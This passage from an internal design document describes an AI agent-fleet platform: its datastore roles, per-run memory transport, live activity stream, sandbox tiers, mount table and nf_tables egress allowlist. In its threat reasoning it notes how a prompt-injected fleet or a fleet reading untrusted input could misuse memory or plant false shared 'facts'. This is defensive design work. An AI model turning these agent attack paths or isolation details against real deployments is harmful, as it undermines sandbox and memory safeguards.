| **Datastore identity** | `api_runtime` Postgres role | *Which process identity* writes the rows | Postgres `GRANT` |

```text
   caller (Clerk JWT, runner:register)                  runner (agt_r token, NO db creds)
        |  GET/POST /v1/fleet, /v1/admin/runners                  |  Native runner stream
        v                                                   v
   +-------------------------------------------------------------------------+
   | agentsfleetd                                                            |
   |   Layer 1 - scope check: does caller hold runner:register? (admin routes) |
   |   Layer 2 - writes runner.* connecting to PG as api_runtime             |
   +-------------------------------------------------------------------------+
                                        v
            runner.runners . thread.runs . thread.threads
            GRANT SELECT, INSERT, UPDATE ... TO api_runtime   (the runner schema slots)
            - no worker_runtime grant, no runner_runtime role -
```

Three load-bearing facts:

1. **The runner never authenticates to Postgres.** It holds zero datastore credentials and reaches the platform only over `/v1/runners`. `agentsfleetd` writes every `runner.*` row *on the runner's behalf*, connecting as `api_runtime`.

   The runner schema slots grant those tables to `api_runtime` only. They never mention `worker_runtime`, dead substrate removed wholesale in the worker-substrate retirement workstream.

2. **`runner:register` is not a Postgres role; it is a token scope**. "Whoever may enroll has access to the runner tables" is an *API-authorization* statement, already satisfied at Layer 1. Layer 1 gates `register` and the fleet-management routes; `runner:register` is not, and must not become, a database `GRANT`.

3. **Therefore there is no `runner_runtime` role, and there must never be one**. A `runner_*`-named datastore role would assert that the runner connects to the datastore. That is exactly the guarantee this fleet is built to deny.

   An in-PR `worker_runtime` to `runner_runtime` rename was rejected for this reason; removal, not rename, is the correct direction.

If connection-level isolation of the fleet write path is ever warranted, that is a **control-plane** role. Name it `fleet_runtime` and back it with its own pool.

Justify it with a real threat model that treats the fleet writes as a distinct compromise surface. It is never a runner-named role.

It also stays out of scope while `agentsfleetd` runs a single write pool. A second role with no second pool or code path is the dead-role anti-pattern the role-consolidation work exists to remove.

## Running one event

The heading keeps its old words so links to it stay stable; one event is one turn.

A `run` reply is the runner's entire input for a turn. The runner runs the turn and sends the result back with `report`. [Runner runtime](./runner_execution.md) §"One run, end to end" walks the runner's side.

```text
run -> { event, ExecutionPolicy, instructions }  (full shape: API reference > Runner plane)
   (`instructions` = the `instructions_md` of the fleet's selected setup revision,
    read by the assignment from the installed revision; the agent loop builds the
    system prompt from it so the reviewed behaviour runs on every trigger. Soft
    reasoning input, never a secret: the provider key and secrets_map stay in
    ExecutionPolicy and the supervisor.)
   |
agentsfleet-runner supervisor: admit the policy, take the fleet's turn, load memory;
   when a tool runs in a sandbox, take the fleet's held sandbox or build one and check
   the bound repositories out
   |
   +- agent loop (in the supervisor): model calls with the run's key; each tool call
      runs where its runtime says, in the supervisor or through the sandbox's executor
   |
report -> agentsfleetd: one transaction (settle + terminal state + checkpoint
          + freed thread + the OWED DELIVERY), then, after it commits, the
          activity frame and the af.delivery.wake ping
```

The turn's settlement, usage, terminal state, checkpoint, thread release and owed delivery commit together.
A failed transaction leaves the run active and unsettled. A lost response is retried against the stored outcome without another charge.

Activity publication and outbound dispatch follow the commit. See [`data_flow.md`](./data_flow.md) §`C. EXECUTE`.

The durable run guard lives in `agentsfleetd` via `run_expires_at` and `fencing_token` (see **Reclaim** below). On the runner, each run is one task that owns its sandbox.

A sandbox is held or destroyed exactly once. The engine's boot sweep removes what a crashed runner left ([`runner_execution.md`](./runner_execution.md) §"A run's sandbox today").

### Process-boundary hardening

bubblewrap, Landlock, seccomp, the run's cgroup and the process boundary under them are [runner_execution.md](./runner_execution.md) §"Sandbox engines". Network egress is the orthogonal layer (§Egress model).

### Multi-run events

The heading keeps its old words so links to it stay stable.

One run is one run. [Conversation compaction](context_lifecycle.md) saves working notes and continues within that run, retaining tool access.
A report's outcome is `processed` or `fleet_error`; context pressure does not request another run (`af_wire`'s report type).

A continuation turn still exists, chained by `resumes_turn_id`. An approval's answer writes one, and the next run runs it (`afd_approval`'s inbox resolve). Durable state across runs is in `agentsfleetd`, never runner-local, which is why any runner can take the next turn.

Sticky routing (below) prefers the runner that ran the previous turn, but correctness never depends on it.

## Memory continuity: durable fleet memory rides the trusted plane

Memory is the second kind of cross-run state, under the same law as the checkpoint. Durable fleet memory lives only behind `agentsfleetd`, never in the runner and never in the fleet. The runner reaches it through `agentsfleetd`'s runner API alone and holds no credential for any store.

Postgres is the only store built: `afd_memory::PgStore`, behind `afd_memory::Memories` (§"Memory backends and scope"). The resume context records the last turn and answer; it is saved, and no run carries it yet ([`runner_execution.md`](./runner_execution.md) §"Workspace between runs").

Memory carries the fleet's learned knowledge: the `memory_store` / `memory_recall` durable scratchpad. It is loaded into a run and captured out of it, and is never runner-local-durable.

The memory tools run in the supervisor. A sandbox therefore holds **no** `agt_r` token, **no** control-plane URL, **no** Data Source Name (DSN) and no memory. A prompt-injected fleet cannot be talked into "reach your memory endpoint", because none exists inside it.

The run's working store is `afr_memory::Loaded`, in the supervisor's memory, with no on-disk file.

Durability is the supervisor's job, over the same `agt_r` `/v1/runners` plane that already carries runs and reports. Two fencing-verified routes carry it, a load (`Verb::Load`) and a capture under `/v1/runners/me/memory/{fleet_id}`. A capped recall rides beside them (API reference › Runner plane).

Capture writes under `SET ROLE memory_runtime` ([memory.md](./memory.md) §2, Isolation).

The run and the report carry the same memory without those two round trips. A run's reply carries the fleet's window (`run.memory`), read after the issue while the run holds the fleet's thread.

A report on such a run carries the run's deltas (`memory`). The daemon captures them, fenced on the run's own token, in the memory role's transaction. It does so before it commits the settle.

The settle frees the thread, so no run for the fleet can issue between the capture and the commit. A capture that fails is logged as `memory_capture_failed`, and the report still settles. The two routes stay for a run from an older daemon, which carries no window.

```text
        +---------------------------------------------------------------+
        |  Postgres . memory.entries         <- ONLY durable store      |
        |  written under SET ROLE memory_runtime (datastore role)       |
        +---------------------------------------------------------------+
          GET /v1/runners/me/memory/{id}   POST /v1/runners/me/memory/{id}
          (load prior memory)             (capture run memory)
          [agt_r + fencing]               [agt_r + fencing]
                   |                             |
        +-------------------------------------------------------------+
        |  agentsfleet-runner SUPERVISOR (trusted): holds the agt_r   |
        |  the agent loop and the memory tools run here;              |
        |  in-run store = afr_memory::Loaded (no disk file)           |
        |  fleet calls memory_recall() / memory_store()               |
        +-------------------------------------------------------------+
            executor socket v tool calls only
        =============================================================
        |  sandbox: tool calls only; NO token, URL, DSN or memory     |  <- SANDBOX BOUNDARY
        =============================================================
```

**The carry-over, one fleet, two runs:**

```text
RUN 1  (first ever for fleet A)
  run{ fleet=A, fence=7 } -> runner supervisor
  supervisor -GET /me/memory->  []             (empty: nothing stored yet)
  supervisor seeds the run's EMPTY store
  fleet:  memory_store("todo", "step 3 of 5"),  memory_store("prefs", ...)
  run-end  +  every memory_checkpoint_every:
     the run's store -> deltas
     supervisor -POST /me/memory->  agentsfleetd INSERTs rows   (fleet_id = A)
  run ends -> the run's store is dropped (no disk file)

  Postgres now holds:   A . todo . "step 3 of 5"    |    A . prefs . ...

RUN 2  (next run, same fleet A)                          <-- THE CARRY-OVER
  run{ fleet=A, fence=8 } -> runner supervisor
  supervisor -GET /me/memory->  [todo, prefs]  (run 1's memory)
  supervisor seeds the run's store WITH those entries
  fleet:  memory_recall("todo") -> "step 3 of 5"   -> continues from step 3
          memory_store("todo", "step 5 of 5")     (same key -> UPDATE)
  push -> agentsfleetd UPDATEs (todo, A) + INSERTs any new keys (idempotent)
```

**Data model.** Scope, isolation, and durability are canonical in [`memory.md`](./memory.md) §1–§2 and are not restated here. This transport owns one fact.

The `fleet_id` a push is scoped to is derived server-side from the run `agentsfleetd` issued, so a client-supplied scope is ignored. The upsert is idempotent, which is why a retried push is safe.

**Multi-run isolation invariant**. Concurrent-run safety (M88_002's worker pool) rests on the per-fleet **thread row admitting a single live holder**. That is `thread.threads` keyed by the fleet's id plus the `run_expires_at < now` time gate, plus **capture-time `fencing_token`** rejecting a stale holder.

It is *not* a unique constraint on `thread.runs`. Multiple run rows per fleet are normal, and a slow old holder can transiently coexist with a reclaimer. That is why fencing exists: only one writer durably lands in a fleet's namespace.

So a runner's N concurrent runs are always N *distinct* fleets, which means N distinct namespaces. Isolation does **not** rest on `fleet_id` scoping alone.

A future retry, speculative, failover or takeover-run feature would have to scope memory by `run_id` first. Any such feature breaks the single-live-holder property.

Keep this invariant load-bearing. A held sandbox ([`runner_execution.md`](./runner_execution.md) §"Workspace between runs") keeps it.

The hold gives its runner a head start at the thread, never the thread. The holder is assigned through the same fencing-guarded statement.

The decided workspace scope (§"Memory backends and scope") gives one workspace key many live writers by design. Its fencing token proves a live run, not a sole writer; the memory work defines how concurrent writes to one key resolve.

**Cadence.** The supervisor pushes at **run end** (mandatory) and **mid-run** on the existing `memory_checkpoint_every` cadence.

A long run's learned memory is so durable before the run finishes. A crash loses at most the work since the last checkpoint push. Because the run-end push lands before `report`, the fleet's next run loads the snapshot the previous run just stored.

**Selection policy.** The loaded window is a deterministic, category-pinned byte window, a pure function of (rows, budget).

The `core` tier is pinned: every `core` entry, newest-first, within the byte budget. The newest non-core entries fill the remainder.

Unknown and custom categories are windowed, never silently pinned. Cap eviction orders the same way.

The coldest non-core rows are evicted first, and a `core` row is evicted only when no non-core row remains. A fact stored once as `core` so survives both the window and the cap.

No search infrastructure, no scoring. The fleet's own discipline is the primary bound: stable keys, `core` for load-bearing facts, `memory_forget` for stale entries. See [*capabilities.md*](./capabilities.md) §4 memory hygiene.

A dedicated, scalable memory store remains the post-launch direction. The `GET` endpoint is the seam it swaps in behind, with no change to the fleet.

### Memory backends and scope (decided 2026-10-03; built)

Two decisions by Indy on 2026-10-03, after the options below were weighed.

1. **The runner reaches memory only through `agentsfleetd`'s runner API, whatever store holds it** ("Always via agentsfleetd"). Stores sit behind one trait inside `agentsfleetd`: Postgres by default; a vendor store later.

   A workspace's store is flipped in `agentsfleetd`. A flip migrates the workspace's memory to the new store before it takes effect.

   The runner holds no credential for any store. This replaced option C, which Indy chose earlier the same day ("C: hybrid"), before the flip-with-migration requirement arrived.

   The flip shipped in M210_004 with no caller and was removed in M229 (Indy, 2026-10-18). No endpoint called it and no second store existed. The trait, the flip and the in-memory store it was proved against return with the first vendor store.

2. **Memory carries both keys.** Every entry belongs to a workspace; a fleet-scoped entry also belongs to its fleet. A fleet reads and writes its own fleet-scoped memory as today. Workspace-scoped memory is shared by the workspace's fleets and reached only by a fleet granted that access. Indy: "we must have flexibility to have the memory have a key of the fleet_id, workspace_id as well. The workspace_id are restricted based on scope (access control)", refining an earlier "Workspace-wide only". A configured Slack fleet keeps private memory fleet-scoped unless its reviewed grants permit sharing.

| Option weighed | Who talks to the store | Credential the runner holds | `agentsfleetd` calls per run |
|---|---|---|---|
| A · through `agentsfleetd` (chosen) | `agentsfleetd` | none | load and push, plus a capped number for recalls the loaded window misses |
| B · runner direct | the runner | a long-lived store key on every run | none for a vendor |
| C · hybrid (chosen first, replaced) | the runner | a short-lived key scoped to one namespace | one mint per run for a vendor |

**Why through `agentsfleetd`.** A flip that migrates memory means `agentsfleetd` reads and writes every store anyway. With one owner, the two scopes and the workspace-scope access control hold the same on every store. So does the record of which fleet wrote an entry.

That holds whatever a vendor's keys can scope. The runner keeps holding no store credential.

A run still costs one load and one push; a recall the window misses adds a capped number of calls.

**Accepted risks.** Shared memory lets a private channel's facts reach other fleets.

Shared memory also lets a fleet reading untrusted input plant a "fact" that a fleet holding a write token trusts. Both now pass only through workspace-scoped memory, which only granted fleets reach, and the recorded writer keeps every shared entry traceable.

**Built.** Every memory read and write in `agentsfleetd` goes through `afd_memory::Memories`, held once by the daemon.

Capture serializes each fleet through its grant row and keeps the run authority on the transaction that writes memory.
A final database-clock check rejects a capture that outlived its run while waiting.

The same transaction holds the upsert, daily sweep and 1,000-entry ceiling. [Capture](../../rustd/crates/daemon/afd_fleet/src/run/memory.rs)

```text
capture -> lock fleet -> shared run lock -> fresh fence
        -> read locked grants -> memory role -> upsert, sweep, evict
        -> API role -> fresh fence -> commit -> release locks
```


`afd_memory::Memories` reads each fleet's workspace and grants from `fleet.fleets`, applies them, and calls the Postgres store, `afd_memory::PgStore`. Every entry keeps its writer fleet in its identity, `(workspace_id, fleet_id, key)`, and carries `workspace_visible`.

Access is a workspace setting with read and publish granted apart: `memory_reads_workspace` and `memory_publishes_workspace` on `fleet.fleets`, set by `PATCH …/fleets/{fleet_id}/memory-access` under `fleet:write`. A granted reader's window carries other fleets' shared entries, each naming its writer, within `LOAD_SHARED_BYTES` after its own window. A share from a fleet without publish is refused by the `memory_store` tool and skipped and counted at the push.

A recall the window cannot fill asks `POST /v1/runners/me/memory/{fleet_id}/recall`, at most `RECALL_MISS_CAP` times per run. Concurrent writers to one key do not arise: the writer is in the key, so two fleets sharing one key hold two entries.

**Still open for the memory work**. Whether `direction.md`'s no-search rule is reversed for a search-capable store, and which vendor goes first. That store brings together the store trait, the flip that migrates a workspace onto it and the endpoint that calls the flip.

The trait must then carry a fleet purge, which today deletes its rows in Postgres directly. M210_004's Discovery records the two write-during-flip races its removed flip left open, for whoever rebuilds it.

## Live activity (the SSE tail)

The agent loop emits progress frames mid-run: tool started, tool completed, and each answer chunk. The runner holds no bus connection, so the supervisor hands each frame to a per-run sink that never blocks the run. A pump batches frames up to 64 KiB, flushing every 250 ms.

At most four batches are queued or in flight. Past that the next batch waits with the batcher and keeps filling.

Only a batch that filled while it waited is dropped, counted and logged as `activity_batch_dropped`. A post that fails loses its batch, logs `activity_frame_write_failed` and counts its frames as dropped (`afr_supervisor`'s activity module).

`afd_fleet`'s activity path publishes the ordered batch on the fleet's `af.thread.<thread_id>.items` subject. Each process's hub shares one NATS connection across downstream Server-Sent Events (SSE) viewers.

```text
agent loop -sink-> activity pump -POST .../activity (no ack)-> agentsfleetd -publish-> NATS -> SSE
```

The runner's frames reach the channel through `afd_fleet::run::activity`, each stamped with the `turn_id` its run runs: `tool_call_started`, `tool_call_progress`, `tool_call_completed` and `chunk`. Frame kinds and fields: API reference › Fleets (Stream live fleet activity).

The runner fills these from each call it runs. Arguments are serialized with every string leaf scrubbed of the redaction set and of known secret patterns first.

So `args_redacted` is always valid JSON (at most 2 KiB). A secret holding a quote or backslash cannot slip past the substring match.

Each output edge is at most 1 KiB, cut on a UTF-8 boundary. Invalid UTF-8 is replaced, control and bidirectional characters are removed, and the edge is scrubbed the same way.

A binary response body so cannot make the daemon refuse a batch. A completed frame from an older runner carries no outcome, and a reader treats that as unknown, not failed.

How the runner captures a call is the subject of [`runner_execution.md`](./runner_execution.md).

Every call ends exactly once. When a run ends for any reason, the runner emits `tool_call_completed` with `status: interrupted` for each call still open. A crash, kill or timeout so never leaves a call running in a browser or missing from the record.

The run's trace rides the report, up to 200 calls and 64 KiB. Past the byte cap a call keeps its row without output edges, and past 200 calls it is counted as omitted.

`agentsfleetd` parses the trace after the report's own fields and checks its bounds. `agentsfleetd` rewrites each call id to the fenced `{fence}:{n}` the live frames use. It writes the trace to `thread.turns.tool_calls` in the statement that writes the reply, so a fenced-out report writes neither.

A trace that is malformed or over a bound is dropped and logged, and the report still settles. The run's outcome must not be lost over its tool list.

Each call's full arguments and output ride neither the live tail nor the report. They are capped at 64 KiB each and 1 MiB per run, under the same scrub.

The runner posts them in batches of at most 256 KiB to `POST /v1/runners/me/runs/{run_id}/items` under the run's fencing token, before the report. That keeps the report far below the runner routes' 2 MB request limit. That limit is axum's default, and the router mounts runner routes with no other.

The daemon stores them in `thread.items`, a child table of `thread.turns`, keyed by turn, fence and call number. Settlement deletes the turn's items from every other fence, because a reclaimed run restarts its call numbers at 1. A failed post costs only the full view; the run settles as before.

`call_id` is the runner's own counter for the run. It is minted when a call starts and repeated on each of its frames (`afr_agent`'s ledger).

The daemon accepts `call_id` as optional and bounded by `CALL_ID_MAX_BYTES`. It publishes it as `{fence}:{call_id}` under the run's fencing token.

A reclaimed run re-runs the same turn from a fresh runner whose counter restarts at 1. The fence keeps its calls apart from the dead run's.

The activity structs refuse unknown fields, so a runner sending `call_id` needs a daemon that reads it. Both ship in one release, and the release workflow deploys the Fly daemons before the metal runners (`deploy-metal-canary-prod` needs `deploy-fly-prod`).

The outcome fields and the report's `tool_calls` follow the same order, with a sharper edge. An older daemon refuses a whole report that carries `tool_calls`. Rolling the daemon back below the release that added it so needs the runners rolled back first.

The sandbox hold adds two more fields with the same edge. An older daemon refuses a report that carries `held_until`.

It reads every heartbeat that carries `holds` as no report at all, dropping its capability report with it. So the daemon ships before its runners, and rolls back after them.

A browser pairs a call's frames by `call_id`; a frame from an older runner has none and pairs by name and timing.

Two planes, kept apart on purpose. **Activity** is ephemeral and best-effort (a dropped frame is cosmetic); **report** is the durable system of record. The live tail is never the source of truth.

The runner reports the durable outcome before its bounded activity drain. Activity uses the established native connection, and a late frame may arrive after completion.

Runner chunks carry a pass start marker, contiguous-delivery flag, and sequence number. The browser rejects a gap, ignores activity after completion, and reads the durable turn detail to settle the final answer.

The browser's reply decoder uses Hermes protocol parsing and incremental HTML tokenization. That keeps reasoning and tool protocol out of the visible answer. After the first visible delta, it batches display updates at a 50 ms interval.

The bracket frames are published by `agentsfleetd` itself (`afd_fleet::run::bracket`, shapes in `afd_api_wire::tail::TailFrame`). So the tail has open and close markers even before the runner forwards a single mid-run frame.

The bracket frames are `turn_received`, `turn_complete`, and `gate_opened` / `gate_resolved`. The run verb or an approval's resolve writes `turn_received` with the row; a report or a gate refusal closes it with `turn_complete`.

Each carries what a watcher needs to fold it in without a read. `turn_complete` is the terminal row from the closing statement's `RETURNING`. The gate frames carry `pending_approvals` from the statement that moved the gate.

`turn_admitted` and `turn_received` carry a person's message kept to the 64 KiB tail batch (`afd_bus::TAIL_BATCH_BYTES`). A longer message rides as its head, cut on a character boundary, with `message_trimmed: true`. The turn holds the whole text.

Frame kinds and fields: API reference › Fleets (Stream live fleet activity).

Every daemon frame also carries the fleet's activity counters as an absolute snapshot, so the wall's tiles assign rather than add. The closing statement reads them beside the row it ends. Every other publisher reads them once, by primary key off `fleet.activity_counters`, right before its publish (`afd_turns::fleet_counters_best_effort`).

The opening bracket must read after its insert. That insert fires the counter trigger, and a `RETURNING` on it cannot see the trigger's write.

The read is best-effort like the publish. A read that does not answer sends the frame with the counters absent, which a client reads as "leave what you have standing". It never sends zeros, which a client would read as a fleet that has done nothing.

A publisher whose own write moved the counters (the receive, the continuation, the park, the resolve) reads on the connection that write held. So the hot path pays one statement and no second acquire; the sweep reads once per distinct fleet.

Both counters only grow, so a client keeps the GREATER of what it holds and what a frame carries. That is what makes a frame that crossed a `hello` in flight harmless.

A `catching_up` is followed by a fresh `hello`. The dropped frames are exactly the ones that moved the counters, so the backfill recovers the rows and the greeting recovers the figures. The workspace `hello` reads its map by `workspace_id` and `ANY(fleet ids)`, uncached, only when a greeting goes out.

No daemon frame names its fleet or workspace. The tail is one fleet's channel. The workspace multiplex splices `fleet_id` in as the one leading key of every frame it forwards (`afd_sse::Frame::tagged`).

Every bracket and gate publish goes through `afd_bus::Handle::publish_frame` and is best-effort like the runner's frames. The row is written first, the frame announces it, and reconnect backfill recovers durable turn rows from the turns list. A failed publish owes its subject an `Af-Gap` marker, paid at the next reconnect, and that marker's `catching_up` triggers the backfill.

The dashboard opens streams through authenticated, same-origin Next.js `/live/*` proxies.
The daemon serves asynchronous response bodies through the shared hub, with a separate stream admission ceiling.
[Data Flow's WATCH section](./data_flow.md#d-watch--user-side-how-the-live-tail-surfaces) owns authentication, recovery limits, and the per-hop HTTP topology.

## Steer, archive, delete

`agentsfleetd` decides all three, because it owns both `fleet.fleets.status` and run issuance. A fleet is `installing`, `active` or `archived`; there is no stop, resume or pause.

Renewal reads the fleet's stored config whatever its status (`afd_fleet`'s run coverage read). A run on an archived fleet therefore still stops at the fleet's stored budget ceiling. An archived fleet's config cannot be edited.

- **Steer** — a message to a fleet. The send answers one of three dispositions: `started`, `folded` or `queued`. With no run live and nothing waiting, the message starts a run of its own.

  While a run is live, the message **folds** into that run. The send answers `folded` with `folded_into_turn_id`. The running run takes it at its next model call through a native `folds` request.

  A run takes a person's messages in its own conversation after its own, oldest first. It stops at the first parked (approval-gated), task-bound or non-person one.

That message is a barrier, and nothing after it folds. The model call in flight is never cut short.

  When the run reports succeeded, each folded message's own turn gets the run's reply. Anything else waits its turn as `queued`. Not an interrupt.

- **Archive** — `PATCH /v1/workspaces/{workspace_id}/fleets/{fleet_id}` with `status: archived` (`agentsfleet fleet archive`) sets `status=archived` and stops issuing runs. It cancels setup grants, marks live runs `cancel_requested_at` and sends each runner a Cancel (`afd_setup`'s creation patch). History stays readable, and archive is terminal.

- **Gate trip** — a tripped anomaly rule archives the fleet (`afd_gate`'s gate archive), and the turn that tripped it ends as `fleet_archived`. A matching gate rule never archives; it always asks a person. It writes only the status: a run in flight runs to its own end, its fleet's budget ceiling, or `MAX_RUNTIME`.

- **Delete** — `DELETE` on the fleet (`agentsfleet fleet delete`) removes it in any status. It first does what archive does to live work (`afd_setup`'s creation release), then purges the rows. A runner that reads the Cancel after its run row is gone stops at its next renewal, which answers `RUN_NOT_FOUND`.

Archive and delete reach a running run only through the runner Cancel message; the heartbeat still names no run.

## Cold and warm execution

A run runs in a fresh sandbox or its fleet's held sandbox. A run that fails, is interrupted or is superseded tears its sandbox down.

The runner's per-run sandbox, its measured cold start and where its bytes live are in [`runner_execution.md`](./runner_execution.md) §"A run's sandbox today". A run whose tools all run in the supervisor starts no sandbox at all.

A run that ends **processed** leaves its sandbox **held** for the same fleet. The frozen sandbox keeps its workspace files for ten idle minutes ([Workspace between runs](./runner_execution.md#workspace-between-runs)). The fleet's next run can continue in it.

Every run carries the config of the head revision its assignment read, and fresh secrets. A hold whose limits or policy changed is destroyed. Sticky routing remains a hint.

The report's guarded release may accept a hold within that window.
Its reply names the exact run, fence and deadline; a refused hold releases that local reservation.
Replaying the report never extends or recreates a hold.

Every heartbeat lists the fleets the runner still holds.
It clears missing holds, except those reported within the last beat interval.
An expired late report can settle usage while refusing a hold that would exceed capacity.

A `closing` heartbeat also clears those recently reported holds because the runner's list is final. The heartbeat response names holds whose fleet became inactive or was held elsewhere. An unreadable, out-of-bounds or empty list holds nothing.

The run poll carries the same list. The holder checks those fleets before its ledger candidate scan. Both the candidate scan and the assignment skip a fleet held by another eligible runner with an unexpired hold.

Eligibility requires that holder to be active, not degraded, and seen within `RUNNER_OFFLINE_AFTER`. Another runner's assignment clears `hold_expires_at`; the holder's own assignment keeps it.

`resume_hold` requires the thread's last run to have run on that runner, an unexpired hold, and a turn that is not a reclaim. Other holds may predate another runner's run or this turn's first run. Otherwise any eligible runner takes the turn in a fresh sandbox, without waiting for a particular runner.

## Config

A Fleet's config is the `config` member of its selected setup revision in `fleet.revisions`, validated by `af_fleet_runtime::Definition`. It holds the model, tool allowlist, network policy, context budget, gate rules, trigger settings and secret references.

The assignment reads it from that revision (`afd_fleet`'s installed-revision read). A reviewed improvement (`POST /v1/workspaces/{ws}/fleets/{id}/revisions`, N11 in [`api_resources.md`](./api_resources.md)) appends a new revision and selects it. `PATCH` on the fleet changes only its status and name.

Every assignment reads the fleet's `head_revision_id` in its own statement. Each replica caches the parsed definition keyed by that id, and revisions are append-only, so an id never names two documents. A config change therefore takes effect on the **next command** (the next run) on every replica, with no signal between them.

A cache key is built only from a statement's row, so no lookup by bare fleet id compiles. There is no `fleet_config_changed` consumer to wait on; the deleted worker's watcher-reload path is gone.

A config change never alters a language-model turn already in flight. The next run picks it up.

## Money gates

The gates run before the run is issued and charge nothing. The issued run's hold is reserved, and each `/renew` and the report log the slice's usage for the biller to settle. An uncovered renewal is refused `UZ-RUN-012` ([billing_and_provider_keys.md](./billing_and_provider_keys.md) §3, One debit point).

## Datastore topology

PostgreSQL owns the inbound turn queue, owed deliveries and device-login sessions. Core NATS carries items, wake notifications, runner commands and the delivery ping.
The [datastore design](./datastore_scaling.md#the-turns-ledger-is-the-queue) owns the queue predicate, limits and failure rules.

An assignment takes the fleet's thread row before its exact oldest unsettled turn. Both fences advance in one transaction.

Locked or parked heads cannot expose later turns. A gate answer clears the park stamp and publishes a best-effort wake.

The candidate query prefers held fleets and a recent wake hint, then the runner's previous fleet, with random ordering for the rest.
It checks runner labels and live sandbox holds before attempting an assignment.

The gateway assigns on notifications and capacity changes.
Each replica's 5 s recovery probe reads PostgreSQL, so missing notifications cannot hide accepted work.

## Sandbox tiers

The control plane ASSIGNS a tier to each runner row (`agentsfleet platform runners register` or the fleet PATCH). It delivers the tier with the runner's identity on enrollment and every heartbeat.

The host probes what its kernel can enforce and reports that upward. A host whose report cannot satisfy its assignment is marked degraded and issued no work (§Assigned policy and reconciliation).

The capability report stays unauthenticated self-assertion, so trust for placement remains operator-assigned, not host-claimed. Only tiers with real enforcement are assignable (`af_wire`'s runner types).

| `sandbox_tier` | Where | What the daemon demands of the report |
|---|---|---|
| `landlock_full` | Linux host | Landlock, seccomp, bubblewrap and every required cgroup controller |
| `container_nested` | runner inside a container on a Linux host or VM (Virtual Machine) | the same set: the sandbox applies Landlock on every tier |
| `dev_none` | development | nothing; a policy other than `allow_all` reads degraded under it, because only a sandbox enforces one |

The runner builds the same bubblewrap sandbox under every tier. A host that cannot build one refuses `run` at boot ([`runner_execution.md`](./runner_execution.md) §"Sandbox engines"). The tier labels the self-test and sets what the daemon's reconcile demands (`afd_runner`'s reconcile module).

On a Mac, `agentsfleet-runner` runs inside a Linux VM (Docker Desktop, OrbStack or Lima). There is no macOS engine.

> **Tiers ≠ egress policy.** `sandbox_tier` reports *isolation strength* (file system, system call, process) and is **orthogonal** to network egress.

> Landlock governs the file system; its network support is TCP *port* binding and connecting only, not host allowlisting. So no tier substitutes for the egress model below.

## The sandbox filesystem rules

A sandbox sees a mount namespace bubblewrap builds from a fixed set, in one order (`afr_sandbox`'s bubblewrap module):

| Inside | From | Mode |
|---|---|---|
| `/` | the admitted toolbox image's mount | read-only |
| `/proc`, `/dev` | a fresh `/proc` for the sandbox's process namespace, a minimal device tree | as bubblewrap mounts them |
| `/dev/shm` | a private tmpfs, a quarter of the run's memory | read-write, `1777` |
| `/tmp` | the workspace disk's `tmp/` directory | read-write |
| `/run` | a private tmpfs | read-write |
| `/workspace` | the workspace disk's `workspace/` directory | read-write |
| `/opt/agentsfleet/agentsfleet-runner` | the runner binary | read-only |
| `/etc/hosts`, `/etc/resolv.conf` | the run's rendered resolver files, under `allow_list_egress` only | read-only |
| `/etc/hosts`, `/etc/resolv.conf` | the host's own files, under `allow_all` only; a file the host lacks stays the image's | read-only |

Everything else a run reads, `/etc` and the certificate store included, comes from the toolbox image. No host file reaches a sandbox unless this table names it.

Landlock then narrows writes to `/workspace`, `/tmp`, `/dev/pts` and `/dev/shm` (`afr_sandbox`'s harden module). It also allows the single devices a shell opens: `/dev/null`, `/dev/zero`, `/dev/full`, `/dev/tty` and `/dev/ptmx`.

The assigned policy carries an operator list of extra binds, each with a mode and a note. The daemon validates and stores it, and the dashboard refuses an entry that overlaps a protected path. The runner binds none of them, so the table above names every host path a sandbox mounts.

The table covers the file system alone. Under `allow_all` the sandbox also shares the host's network namespace (§Egress model).

## Egress model: outbound is the only network surface

The runner box is **outbound-only**. It runs no inbound listener (the supervisor dials the control plane over HTTPS; see §Datastore role model) and holds no co-located datastore. No model key or minted token enters a sandbox.

The network threat from a sandbox is a tenant program sending the workspace's contents, or anything it computes, somewhere it should not. The other threat is reaching an internal address.

Three network policies, assigned per runner (`af_wire`'s runner types):

- **`allow_all`** — bubblewrap is not given `--unshare-net` (`afr_sandbox`'s bubblewrap module). The sandbox stays in the host's network namespace, and all outbound egress is allowed.

- **`deny_all_egress`** — the sandbox's own network namespace, with loopback only; it reaches nothing. A missing assignment gets the same, because a runner never opens egress on missing input.

- **`allow_list_egress` (enforced allowlist)** — the sandbox keeps its **own** network namespace, joined to the host by one **veth pair**, `afv<slot>`. The link is point-to-point `10.69.<slot>.0/30` (host `.1`, sandbox `.2`), slot `0..=253`. The runner installs **default-deny nf_tables rules in the host namespace**, on the host side of the pair.

  The rules are owned by root and never live inside the sandbox's namespace, so `nft flush ruleset` inside it changes nothing. Egress is permitted only to the IPv4 set resolved at run bind. Traffic to any other address is dropped at the kernel, a raw address included, but the set matches addresses alone (residuals below).

  A host the fleet names never brings a private or reserved address into the set. The run is refused instead, as the fail-closed rules below say.

**One table per sandbox, scoped to its link.** The table is `inet afegress<slot>`, built over netlink from Rust, never through the `nft` or `ip` binaries. It holds the set of allowed addresses and three chains:

| Chain | Hook | Rules, every one scoped to `afv<slot>` |
|---|---|---|
| forward | forward, policy accept | from the sandbox: drop TCP and UDP port 53, accept the set, drop the rest; to the sandbox: accept established and related traffic, drop the rest |
| input | input, policy accept | drop anything arriving from the sandbox's link |
| postrouting | postrouting, network address translation | masquerade the `/30` out of any other interface |

Every base chain accepts by policy and drops only on its own link. One sandbox's table so never touches another sandbox's or the host's forwarded traffic.

The deleted runner's design differed here. Each worker's table had a forward chain with `policy drop`, which dropped every other worker's and the host's forwarded packets.

**The merged sandbox allowlist.** At run bind, the supervisor starts with the runner's assigned `registry_allowlist` or, when empty, the default registry set. It then appends the fleet's `network.allow`, deduplicating in first-seen order.

The default registries are `registry.npmjs.org`, `pypi.org`, `files.pythonhosted.org`, `static.crates.io`, `crates.io`, `index.crates.io`, `proxy.golang.org` and `sum.golang.org`.

A fleet with `read_only` keeps its hosts out of the kernel set. Kernel rules cannot enforce HTTP methods; those destinations remain available through guarded HTTP tools.

Each entry is read as a URL's host, using `https://` when no scheme is present. A scheme, port or path is dropped; `[::1]:80` names `::1`.

HTTP tools parse additional domains with the same helper, `af_egress::allowlist_host`. The supervisor resolves sandbox names to IPv4 with the host resolver.

**The inference host is not in the set.** The agent loop calls the model provider from the supervisor, outside every sandbox.

The agent loop uses the base URL saved for the selected model ([`runner_execution.md`](./runner_execution.md) §Crates). A sandbox has no reason to reach it.

